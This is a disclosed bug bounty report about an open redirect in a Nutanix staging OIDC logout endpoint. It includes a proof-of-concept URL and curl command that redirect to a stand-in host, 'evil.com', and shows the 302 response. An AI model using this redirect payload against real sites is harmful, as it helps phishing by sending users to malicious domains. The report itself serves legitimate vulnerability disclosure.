# OPEN REDIRECT 

## Report Details
- **Report ID**: 1369806
- **URL**: https://hackerone.com/reports/1369806
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-10-13T20:56:40.666Z
- **Disclosed**: 2022-01-04T16:14:08.107Z

## Reporter
- **Username**: kauenavarro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nutanix

## Vulnerability Information
Open Redirect Vulnerability
Hello , found open redirect in https://stage.test.dev-iam.xi.nutanix.com/api/iam/authn/v1/oidc/logout?post_logout_redirect_uri=.

Go to

https://stage.test.dev-iam.xi.nutanix.com/api/iam/authn/v1/oidc/logout?post_logout_redirect_uri=http://evil.com&id_token_hint=test

curl -I "https://stage.test.dev-iam.xi.nutanix.com/api/iam/authn/v1/oidc/logout?post_logout_redirect_uri=http://evil.com&id_token_hint=test"

HTTP/2 302 
content-type: text/html; charset=utf-8
location: http://evil.com
date: Wed, 13 Oct 2021 20:55:57 GMT
x-envoy-upstream-service-time: 2
server: envoy


##Reference

https://hackerone.com/reports/504751
https://portswigger.net/kb/issues/00500100_open-redirection-reflected

## Impact

An attacker can use this vulnerability to redirect users to other malicious websites, which can be used for phishing and similar attacks

## Attachments
No attachments
